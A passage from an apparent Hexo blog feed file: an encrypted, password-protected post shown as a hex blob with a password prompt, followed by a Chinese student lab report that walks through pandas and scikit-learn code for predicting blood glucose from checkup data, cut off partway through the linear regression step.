218b4a1af44ab7a581409f3be951346f4279dc5e8fc28b61a8b2cfe59a7fa8a74f34a5bfd7536a02789271bf902e04c601eda18926d1e8cbccf050d21a55e9eae270228f687e4dad444a0077ec4ab52174664686120cabb94d981620487a2cd09dc65a4792d0693842af87012f9f4e244bacecb7f23075e658933e204137708db99c7e35d26322c142f902bc8df4e168aa9cd8a97406d627ff388dcdd9c008e828139eca2ed6a77378ac69bf08f678dd19c2e820b2fbe237b9f5d7243ec48d9c422fe3f03540c0016469a90ae576704722ddf84131d82b1379c55f07e7fb73a326190b604dd14eb35d033ae52fa715e4ee16e89cdc0085d19ec112019136b1ea3b18c2d47b654434fc1433cbe290cffe572574894054dc2019d465822b72874c38a03363427d3a8fee0cb3a8cbee7f1591634bacda93e5590b9087417eb298e600be7cf5d3be852250a061f8413213157dd36a6a447ce12c0112010cc47870fca617aa185e221f06b1c16961d356af5877fb57858cc7a5403ecd62f5d03fe80e4c6a9275187e21f3548fa3cc8407a369a4a7cde5955e535f513c159e936d6c86a2e19dc6e52bcaa2ce6172e15e4b9ef7d89bec04bd6f3aaa31e733748a51b987f8ec697f59448aee5c5116388730567fb09156276f049c7a0897441b6c5d3a03b6a2d0c47e90f42dcc2be2e1e3b0996761323cd3a5b940cd06624e40e7a0ba33d531eda8cc22b4cde3fade3239e593e20b825bb7c2f1cab897f3918f7ec957e164b0014c9580bd34959218e087c14d24b5896a0fc1e159071a17068088cd55e90d8426e388d5378c0808b5c23e460a1d97ec536fbc3364966d34206dd0ffadb1c20d81cafda75ea0ae328c5eb22fe3812f6bfa1f2b26e97f8f96753b9bcdff65362d363f963f87f92b26981ee97bf6e73f077827f2fbae73a6b8fc1acb5378bdf41216473e215d63873eeb1ed0815bc576a937fca7e834d192924fe133a9540d51df44d4f3d0a4ac338cb8db52ed45a545fa54ee4e42fe910fc12c7af0d525895d10ef24be6b5ca14df6742ec0110808130339d584e525eb855c6568bc4e50ccc1eb990d0d9d1718d03cd3fa70d568bb31c4163274be3d79a5ae3169fa6b8a4a018e4b7da3f8a52d2b7d1724f97f2727f2a3f55dcd10a4cc22b634c7a635123312dc3ab4272dafffcd5803f4bd15e0949174a255ef812a1fc6f83a296335591d391b06ec42250ef191040c0436f3b9a31bfd9d11d06ac069d41c80e3fb1d5aea5387b923921d870bdefdc36458a9d74ae8a2f9b5ecb47ae878361ab71146159b09882cb1f20b8cf9fa186422bf00578021c3d4025fcaf58010acb88a80c94ff2b6511c239053976934662a1fc62823a95453eead6f141142ae2c6fb6aa0da10e2d489ed70f31859b969f79a7a33f89b90f5912fa49363efebab7274507b9446ee8e3e7c63e66350f1dc26ddef801f5c8fdd73738409063faac6bc12a9c96349e46924cf7827823351de771e706633e025a248589785300ee9f9470ae957f3108855b21805a374bbff9e4829ef5ac290bb7a6cf137823c283ca20c785eed509610c3c67874b0f4ad79e3f1c1b1482428e45eb15aee2fef97deaba150b69f6ab4da11dfa151ce7d6173c69f9c582944efd2cbfe419d83d7435f785f84608b17f797c49e338938f499bc012b7da3c4bdc07f1c5ff36e2c4cb7bd43c3ed5acc7ff942b198fec171ab7bac88a17b2c2e1aba597c28cb71eadaa309cc8401dee35820009880c7377bee605d54436cbb6071e818da7feedd281533bf6bcad2aa849ec52be18a4c9b5846285e9d491c374d424fc5156d6e16652a4338b94eb9444a04acb18b810cdaf3d55c01bc0a6cc386a8383fc984fa019a09de5cfbc0fd6750bbd1794d99af139675e3a3429ec13f48cd9a962825007ef54b10f80c90b9d9799be56348ee9079bc280dd5e412f7ca6f7ef14c9dad5ff2d24cad300849a67309ecf2dd79cca18ed1f35a227253fb21fd32ae3bfed9e83524df33f75f4e30eda5b8a3994a23790147d5d44c3b9f6e625b25e27fc421f7d53a0ad9bfb03b4d7084afdf58fd4a9c8dc2e8badfea021fce9a4f89705b812acc4b80900fd530f53b8e138d0725cff0b9e5606415533f1e40e3f761e715a129e3b015e5c6db62d7e9c670a6720781c611fcf42db81b13a0a44f7d8682a63ab98a91782bd2fc92527ae7064b653ec062b0e9e4e255d61b6b212f03de407d384b7429ac0ae0e6571d8e923491687950a34e76c4e115a842f0cdd6efb280620bbbf8064708c9ef8582744a16c8e3cc512b2293ba96c8eacf0c82a167c4d5b25804014bb264e717b0558e1738bf9412ee3ef874f8c451100450b29db012bea7c4299456e15ca609a17be5e700d2e2a7c30379eacc5d0d232dc4ac0ac30caf90e4084d15eaf92ff72abdc5fa24ea6cbc0cadbf5eaf11e33153561c4044c4658beab5083b2442ea4152d483e9e43326df91832a23c64b4af3706d9abf510f37f5eb6af581d3345b233be8c53bf84976dd1bc768e35668890220b0002b155f97d4597d2b1a56f1032d9bbd488d06b6d05d3aaa0e9fc50e43256b49d1605453815ce73514f6cac9e4024e809928e1dbe31452ed9355a30d0307a4a708d4cbf5cbdf6345d88e3015cb73e46b8baadf560f8c89a7b699ed17e04d4faa8e41d7a1c0dc66dbba6741ed169da89245fea1c55077258317675e8e9bc2084025f9c4befb8539af810637682f2a5f481484d5d6c2072f155251833c02a3b7baa2fb2fde406fa9110fd78b595494d16d37249c06ce8160fb79caecd48c8bfe4238b7d5031abd728a792ec857e878f675118384ff640a0416b95c83deea43b2a37594726b6413e3909ac4ce7d8e6c4667f698ac42bd417d07a46f063226d80a93f3024a80ca51846bd4223ba32f429f4b031922a79eb883ed61f1868e5b7d411d04d7093c2d5bc9ea32789c1ef9600f1324d27c56094801ed9860e1e99dc7aaa0c4b3b1e942726baaf0bdf18fe9ddfc5c6ef209a7f1d83c66b10cde21edb63bade09924272f296d41ff99779e725acae3364c2896285b5bf17dfa78f5482953f31bb0ee4573f58c9d5e2215f519325466418339b8089445b078b8cd17082f278218fc3480d7ad7a3100eecc4dd0b59876a7cac137be1228e5df015553a07060e35d4fbf732e5112696142954fc214b394dc4ae863fa7223300beed41213c40d7844d5de13291ccffa8012e7601d180a0d3783d1f221d5848925f24b82689d4ffb5e2fa5531400f34300494157ff004d434ebba0557717690eb6fe8c4dd4b0ae3464ac35ea68f133f2c1f9b97110bfc513e2a62f4a0d1d98d7193f6a722f38db7dcd2b105a5211ca5f4517c33f6c22e600848813a24d8fe9798cd7b0521a92ea89e2ae494d4004437f5e1cbeb3c87ef486d25659f66fa42b8e43ab4b260dd51cc97e9929574952ab7e48886236ed0232810cf45de3a706b8fc9051bfed5c2c47e87d460d02f3ee2e2962438dd08e85e88409de6440ebf9e8136a7f8545ee6daa618268d2758c5d33c5026920102f9e5e673a471a1bb4fbf5b1e2107054d4ebc8e31c3e09b0d97145a9bb1d6f4f0c58567c0f6374eed1c4bdc7289de01b71f712538eb53dcdcfa4dac886711fd0cc18ab1c90298a81b3e63ae4fe750465044dd91daf166dbf886e53aa6e4ae7d71a85c0505217897f96b1bfb8c4e7124492e7ac3a620b4357ff98b0803d523a7f88a839be20dbecb38db5b6aba142cccd5861fe9d70317e7da2f31d9d7e71f9192aff56b14e5e84f73675142e276292757b298b378b09ab1ffd0b4a0af3394386136da28181b1bcd08b2e299e9f2083a2ad1df01c211e35fef70d671d61b33fe5c7f41a9393e331a70d5661ac7cea124af1cfdccd3f2f8f3ef57e4792db4e07239dd478090d6dfa3edd115d16ffc23ee693c426697c54c7fb8dc572e97e927d50abd3aad0d6acaef54f3493dde2919a5adea78bb351e71c98b45d24d448bb90d66bb44e9253025b19e3e96e3d49cd47d29ab2286e111dabaee0bd87c6c2706f037a60ce4ef70b1ccb4963ceaf3e655312c750fba7be08d8550829643d5728356e6a4bc89ecc8cd8ab51324d6e93a2d43d2517198cb117249c352a9785d947dd2902ebab87ca84ae17bb6c2131b9b8ef0db86a834baa60e15ea5d29dd58e3a0c4ad983d72ca46abc16d8c4bbf27d5b8a8781c1791fc738e4e581b191fb945e0ccdccefb20624527a4697ff7871924bdf0a5e0bff73a7d1291003c5100cd81bc55f58fcf9487a67a0c49943e343429a335fbcae80e75aa29c0f3a5fd86c4de1ba7dfe9bf835b7b48037112a9195deece51524223a8585911e6dd08b93707d10ac9cadb4917f6a0d60a6491d069e4b19969438596f9c3abd2c073d12438c9679554eb141ab9d6bacc412808583c4fc10220fdd52fb1ec7d62f9cb4b220cda32e2f7e06c1d8a8d6f60c2b47ee7656a78a3c5b245d896568c46af60913dd271959028bfd51a7d405872ef9c6b336b683632f336b16592b2b7d2e958adb27736b8801ae3bb69ee950bddb5baeb39fd4005b24a960d2ef44e803f01696aae6bcf1ff9107508ba623a8e795032dddf9623eb27ba67c0adb1117d5088c20aa7b77e0b6632f507b9aaaea98c7306ff06775fffe00365824c35ff43bcfab147a2e1792880f87b0baa87fb5ed761063f6713d63e352c85fc27a0e5774f405b9745d9399d5201ca78d697b147b09e128349a99a34a7c28e8319cd396a6ec32c3fd0e71fe4fafa69b58400587676c272e59aba7c124ac16b6b45bcd3f3a3418716259c7e0d56d2f2b9d9070a128f172d92c9a385878d5c8e9623eb5f519e2cb7cde6fad2c03765aa1f884b8b64d8e856a5f7c14fae09142ff6fec6525ef6418dbd770a2c568d0e4e9df05192ee6e503869ea8afee8d33a90f87b5227494f43b65a34730fb37004c994e660c0a3eadb037eae773fcc644820d5e9072db6699ab32188a1f7a44afdfb63be5116e18f379ad1e2c9d0e040417ce48aa21a2b332cb7d3e4f9ebd3233eaee938762fc439b1cf7b0f9cf3798ee1b584ccf510c42fb512444b0abca482e27a41a3d129a58535b1b68b0b3cccd7ccb46e8d62f2558036be5f803ee819d0c5a8a92aaad2f64205f390664e4fc873d991427f5a717ed5d933a8f5e2936aaedf0bae6fc39639266911ccba0b9af3f05f37058678a89bd1aea7670834b1e1b262d5c4ca8b80b4b60c8ddddb55d5bd85ab771f8b657ec401222823dd9438598672652d2536be8f893e8c510e9457a9cc603a4f335c18f23a5b059f7e0119eeabb62589fb1b2684a4c726a0b85ed3db4bf181e8af1ea279bf988d29472b0e8a52a1ce3e40b092acc35cbb796208a20af249f37583d41ac3b3fba8cb54a37936429e3157ac11d1167f2080441c1ba76c244882940a8d54ead8aa83943faeb04791bb5a3e08e152c0e733537e28ceb6aafe1d101f3cfb9e2795352cbda56abf8330c21364ca3ba8d1b5b09be80e33241fde3e2d21ec86690c2ce0ccf6197bb0f84b5834a5064a1851705a31ce71e466a3947406b68ce7c528490241c146b3a1de8f57dc3e2b89116cfd27796ad8354950702d1412c76279e12adac61f4fb56ec4374b62ae6029b9effc662cfb998c5b90971857e4791d376fcc1f8c182d0c59120f3e2586b54ac30119c065c0f39b1660bd2f7163ecd81eb5cbba306a853a6a6c05881ff1210cd39d2c29d49cd2065c58186a4a5a3da1809e11cb0c9031f97ad8499e61226f4460a7cce49aceab3091d8d492fa4e659bc4bc8d31069f01222efbdab5cd532f81d54cdeb4429245de71088d96bb44d25bd4c33221914bbbd3d4fa4c82146f4d51feb718560017c851595d83c1385bde098f7cb0db0c91407d8c1bc0209197bfddef98d862449fe3866b0159c83341c0de584d65e2ddbf6a0e4262932a7459e73b9ee9d8b672f0a6d9d11f91cab44d871db53edc540b98752900c62032f8c4d1a14c0b4b2e9175a6685ab604147f90254dc8342193ebb5eefb82adcef6f4bfe08720acc0254eaed632f0d872ede3d0bdb975f90c7b357a0b50f6612b42e16938dfa7f671a80d5a53688be778ae8cb4cec751340b96268298095dffd052f3367466dea32e48d4e6dde4882c5389ac6ecb7291dd8a622ab20fd6819d0bc8b208279cac28e36d177f3cdda40aa1462ea18a26acd2e5e5355551cf5232e7289035e173d41ebdf9178df9288a62024ccebdbec5923ce762345b1fe50058d4ccc7f75e77a07b7d8c299712267b769b56fee6840256a663debf8c8eb89d24f969c1da2c3b72052c6e0e1b9746b31dd140fab1bd79523df59770c0c4000ee2dd84e3c97c766c301850addca3a667a35638a6fee0305cff0df20fc13086f67b5365e7f207b52516934b7bc31559077500c5ef922982006dd3a80157c1d2e4c1a45d1be41671900ccd030e9a3e8c4fb5a8daaa1f621d1e9d6572e806a94f5c99e291d111a08b9e7ecea784d5c0a91716c2ae019995cd450e27828d440640e71d8dbfe1a3e820328e6e588a27794791559de2a438543dfa7b92043921323bd44f4f6ccdbbafd90e52a1cae508c9f2f7d211adaca171fc74229656e7f5cfbbb6bee3cc903aeecbba5c384685b8fcc4691bf9c9bc93a92e6a88dfc97f081bf7aaa844e987a6fcb1889d435b1ee76a3c06b7e5c158f7fcf4f46dfbeeac16e8b2a744d9848f6b856604c95e9fca727962ad931da003fb26055d1ca1026c8d9a773ceb21e1c01ff32f424f423ca0160d6c9908c29eca284cebb9afd269598fcb2b9211329aa8aa30a64becc88721ee6a383104bf92cc85889ac4416e8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>实验汇报</title>
    <url>/2021/12/30/t-md/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/90503301_p0_master1200.jpg" alt=""></p>
<span id="more"></span>
<h2 id="实验目的"><a class="header-anchor" href="#实验目的">¶</a>实验目的</h2>
<p>预测血糖值</p>
<h2 id="实验步骤"><a class="header-anchor" href="#实验步骤">¶</a>实验步骤</h2>
<h3 id="Step1-数据概览"><a class="header-anchor" href="#Step1-数据概览">¶</a>Step1 数据概览</h3>
<h4 id="导部分入包"><a class="header-anchor" href="#导部分入包">¶</a>导部分入包</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">from</span> dateutil.parser <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> KFold</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> mutual_info_regression</span><br><span class="line"><span class="keyword">from</span> pylab <span class="keyword">import</span> mpl</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> stats</span><br><span class="line"><span class="keyword">from</span> scipy.stats <span class="keyword">import</span> norm, skew</span><br></pre></td></tr></table></figure>
<h4 id="数据导入"><a class="header-anchor" href="#数据导入">¶</a>数据导入</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入文件</span></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;/home/hgg/Desktop/ex/data.csv&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="comment"># 设置sns调色板</span></span><br><span class="line">color = sns.color_palette()</span><br><span class="line">sns.set_style(<span class="string">&#x27;darkgrid&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Step2-数据探索"><a class="header-anchor" href="#Step2-数据探索">¶</a>Step2 数据探索</h3>
<h4 id="接下来可以使用-info-discribe-columns等方打印数据信息，基本认识数据集"><a class="header-anchor" href="#接下来可以使用-info-discribe-columns等方打印数据信息，基本认识数据集">¶</a>接下来可以使用 info ,discribe ,columns等方打印数据信息，基本认识数据集</h4>
<h4 id="利用热力图来了解特征间的相关性"><a class="header-anchor" href="#利用热力图来了解特征间的相关性">¶</a>利用热力图来了解特征间的相关性</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.figure(dpi=<span class="number">600</span>)</span><br><span class="line">sns.heatmap(data.corr(),xticklabels=data.corr().columns,yticklabels=data.corr().columns,cmap=<span class="string">&#x27;vlag&#x27;</span>,center=<span class="number">0</span>,annot=<span class="literal">False</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;heatmap&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/79.png" alt=""></p>
<h4 id="计算各个特征的缺失值"><a class="header-anchor" href="#计算各个特征的缺失值">¶</a>计算各个特征的缺失值</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">null_percentage = data.isnull().<span class="built_in">sum</span>()/<span class="built_in">len</span>(data)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;The null data percentage is:\n&#x27;</span>,null_percentage)</span><br><span class="line">mpl.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;Simhei&#x27;</span>]</span><br><span class="line">null_percentage = null_percentage.reset_index()</span><br><span class="line">null_percentage.columns = [<span class="string">&#x27;column_name&#x27;</span>,<span class="string">&#x27;column_value&#x27;</span>]</span><br><span class="line">ind = np.arange(null_percentage.shape[<span class="number">0</span>])</span><br><span class="line">fig , ax = plt.subplots(figsize = (<span class="number">6</span>, <span class="number">8</span>))</span><br><span class="line">rects = ax.barh(ind,null_percentage.column_value.values,color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">ax.set_yticks(ind)</span><br><span class="line">ax.set_yticklabels(null_percentage.column_name.values,rotation=<span class="string">&#x27;horizontal&#x27;</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&quot;各基本特征缺失数据值&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/80.png" alt=""></p>
<h4 id="查看标签分布"><a class="header-anchor" href="#查看标签分布">¶</a>查看标签分布</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(data[<span class="string">&#x27;年龄&#x27;</span>].value_counts())</span><br><span class="line">sns.countplot(data[<span class="string">&#x27;年龄&#x27;</span>],label=<span class="string">&quot;Count&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/81.png" alt=""></p>
<h4 id="查看异常值"><a class="header-anchor" href="#查看异常值">¶</a>查看异常值</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data1=data[<span class="string">&#x27;血糖&#x27;</span>]</span><br><span class="line">u = data1.mean()  <span class="comment"># 计算均值</span></span><br><span class="line">std = data1.std()  <span class="comment"># 计算标准差</span></span><br><span class="line">stats.kstest(data1, <span class="string">&#x27;norm&#x27;</span>, (u, std))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;均值为：%.3f，标准差为：%.3f&#x27;</span> % (u,std))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">error = data1[np.<span class="built_in">abs</span>(data1 - u) &gt; <span class="number">3</span>*std]</span><br><span class="line"><span class="built_in">print</span>(error)</span><br><span class="line">data_c = data1[np.<span class="built_in">abs</span>(data1 - u) &lt;= <span class="number">3</span>*std]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;异常值共%i条&#x27;</span> % <span class="built_in">len</span>(error))</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/82.png" alt=""></p>
<h3 id="Step3-数据预处理"><a class="header-anchor" href="#Step3-数据预处理">¶</a>Step3 数据预处理</h3>
<h4 id="将性别列转化为数字"><a class="header-anchor" href="#将性别列转化为数字">¶</a>将性别列转化为数字</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;性别&#x27;</span>]=data[<span class="string">&#x27;性别&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;男&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;女&#x27;</span>: <span class="number">0</span>,<span class="string">&quot;??&quot;</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="剔除无关列-由于-id-和-日期-不能作为影响血糖值的因素故删除"><a class="header-anchor" href="#剔除无关列-由于-id-和-日期-不能作为影响血糖值的因素故删除">¶</a>剔除无关列 由于 <code>id</code> 和 <code>日期</code>  不能作为影响血糖值的因素故删除</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data = data.drop(<span class="string">&#x27;体检日期&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line">data = data.drop(<span class="string">&#x27;id&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<h4 id="缺失值处理-由于乙肝表面抗原、乙肝表面抗体、乙肝核心抗体、乙肝e抗原、乙肝e抗体这五个基本特征缺失比例超过70-，且这五种基本特征对于预测模型的影响权重较小所以这里选择将这几列直接删除，剩下的用均值填充"><a class="header-anchor" href="#缺失值处理-由于乙肝表面抗原、乙肝表面抗体、乙肝核心抗体、乙肝e抗原、乙肝e抗体这五个基本特征缺失比例超过70-，且这五种基本特征对于预测模型的影响权重较小所以这里选择将这几列直接删除，剩下的用均值填充">¶</a>缺失值处理 由于<code>乙肝表面抗原</code>、<code>乙肝表面抗体</code>、<code>乙肝核心抗体</code>、<code>乙肝e抗原</code>、<code>乙肝e抗体</code>这五个基本特征缺失比例超过70%，且这五种基本特征对于预测模型的影响权重较小所以这里选择将这几列直接删除，剩下的用均值填充</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">thresh_count = data.shape[<span class="number">0</span>]*<span class="number">0.3</span></span><br><span class="line">data = data.dropna(thresh=thresh_count,axis=<span class="number">1</span>)</span><br><span class="line">data_columns = data.columns</span><br><span class="line"><span class="comment">#data_columns = [i for i in data]</span></span><br><span class="line"><span class="comment">#print(data_columns)</span></span><br><span class="line"><span class="keyword">import</span> missingno <span class="keyword">as</span> mno</span><br><span class="line">p = mno.bar(data)</span><br><span class="line"><span class="keyword">from</span> sklearn.impute <span class="keyword">import</span> SimpleImputer</span><br><span class="line">imp = SimpleImputer(missing_values=np.nan,strategy=<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line">data = imp.fit_transform(data,data_columns)</span><br><span class="line">data=pd.DataFrame(data,columns=data_columns)</span><br></pre></td></tr></table></figure>
<h4 id="平滑处理"><a class="header-anchor" href="#平滑处理">¶</a>平滑处理</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">tmp, lambda_ = stats.boxcox(data[<span class="string">&#x27;血糖&#x27;</span>])</span><br><span class="line"></span><br><span class="line">sns.distplot(tmp, fit=norm)</span><br><span class="line">(mu, sigma) = norm.fit(tmp)</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;\n mu = &#123;:.2f&#125; and sigma = &#123;:.2f&#125;\n&#x27;</span>.<span class="built_in">format</span>(mu, sigma))</span><br><span class="line">plt.legend([<span class="string">&#x27;Normal dist. ($\\mu=$ &#123;:.2f&#125; and $\\sigma=$ &#123;:.7f&#125; )&#x27;</span>.<span class="built_in">format</span>(mu, sigma)],</span><br><span class="line">           loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Frequence&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;血糖分布&#x27;</span>)</span><br><span class="line">fig = plt.figure()</span><br><span class="line">res = stats.probplot(tmp, plot=plt)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/84.png" alt=""><br>
<img src="https://gitee.com/Nss-harukii/images/raw/master/83.png" alt=""></p>
<h4 id="异常值处理-删除异常行"><a class="header-anchor" href="#异常值处理-删除异常行">¶</a>异常值处理  删除异常行</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data=data.drop(index=error.index,axis=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<h3 id="Step-4-特征工程"><a class="header-anchor" href="#Step-4-特征工程">¶</a>Step 4 特征工程</h3>
<h4 id="利用回归方法mutual-info-regression计算特征的重要程度"><a class="header-anchor" href="#利用回归方法mutual-info-regression计算特征的重要程度">¶</a>利用回归方法mutual_info_regression计算特征的重要程度</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> mutual_info_regression</span><br><span class="line">mutual_info_np = mutual_info_regression(part_data,data_y)</span><br><span class="line">mutual_info_series = pd.Series(mutual_info_np, index=part_data.columns)</span><br><span class="line">s1=<span class="built_in">sum</span>(mutual_info_series)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="built_in">print</span>(mutual_info_series)</span><br><span class="line">feature_v1 = mutual_info_series/s1</span><br><span class="line"><span class="built_in">print</span>(feature_v1)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/85.png" alt=""></p>
<h4 id="利用单因素分析计算特征重要程度"><a class="header-anchor" href="#利用单因素分析计算特征重要程度">¶</a>利用单因素分析计算特征重要程度</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data_x=part_data.values</span><br><span class="line">corr_values = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_x.shape[<span class="number">1</span>]):</span><br><span class="line">    corr_values.append(<span class="built_in">abs</span>(np.corrcoef(data_x[:,i], data_y)[<span class="number">0</span>, <span class="number">1</span>]))</span><br><span class="line">corr_series = pd.Series(corr_values, index=part_data.columns)</span><br><span class="line">s=<span class="built_in">sum</span>(corr_series)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(corr_series)</span><br><span class="line">feature_v2=corr_series/s</span><br><span class="line"><span class="built_in">print</span>(feature_v2)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/86.png" alt=""></p>
<h4 id="取两种方法的均值，并选出影响大的作为特征"><a class="header-anchor" href="#取两种方法的均值，并选出影响大的作为特征">¶</a>取两种方法的均值，并选出影响大的作为特征</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">feature_values = []</span><br><span class="line">feature_values=(feature_v1+feature_v2)/<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(feature_values)</span><br><span class="line">tz = part_data.loc[:,feature_values &gt; <span class="number">0.01</span>]</span><br><span class="line">importances=tz.columns</span><br><span class="line"><span class="built_in">print</span>(importances)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/87.png" alt=""></p>
<h4 id="特征选取，数据归一化"><a class="header-anchor" href="#特征选取，数据归一化">¶</a>特征选取，数据归一化</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数据归一化</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> *</span><br><span class="line">model = ensemble.ExtraTreesClassifier()</span><br><span class="line">model.fit(tz,data_y.astype(<span class="string">&#x27;int&#x27;</span>))</span><br><span class="line">scaler = StandardScaler()</span><br><span class="line"><span class="comment"># 训练标准化对象tz</span></span><br><span class="line">scaler.fit(tz)  </span><br><span class="line"><span class="comment"># transform()数据标准化x</span></span><br><span class="line">tz= scaler.transform(tz)   </span><br><span class="line"><span class="built_in">print</span>(tz)</span><br></pre></td></tr></table></figure>
<h3 id="Step-5-模型构建"><a class="header-anchor" href="#Step-5-模型构建">¶</a>Step 5 模型构建</h3>
<h4 id="划分数据集"><a class="header-anchor" href="#划分数据集">¶</a>划分数据集</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="built_in">print</span>(data_y.describe())</span><br><span class="line">x_train,x_test,y_train,y_test = train_test_split(tz, data_y, test_size=<span class="number">0.3</span>, random_state=<span class="number">20</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="利用线性回归方法进行建模"><a class="header-anchor" href="#利用线性回归方法进行建模">¶</a>利用线性回归方法进行建模</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line">slr = LinearRegression()</span><br><span class="line">slr.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line">y_train_pred = slr.predict(x_train)</span><br><span class="line"></span><br><span class="line">y_test_pred = slr.predict(x_test)</span><br><span class="line">plt.scatter(y_train_pred, y_train_pred - y_train, c=<span class="string">&#x27;blue&#x27;</span>, marker=<span class="string">&#x27;o&#x27;</span>, label=<span class="string">&#x27;Training data&#x27;</span>)</span><br><span class="line">plt.scatter(y_test_pred, y_test_pred - y_test, c=<span class="string">&#x27;lightgreen&#x27;</span>, marker=<span class="string">&#x27;s&#x27;</span>, label=<span class="string">&#x27;Test data&#x27;</span>)</span><br><span class="line"><span class="comment">#预测值与偏差的关系</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted values&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Residuals&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;upper left&#x27;</span>)</span><br><span class="line">plt.hlines(y=<span class="number">0</span>, xmin=-<span class="number">10</span>, xmax=<span class="number">50</span>, lw=<span class="number">2</span>, color=<span 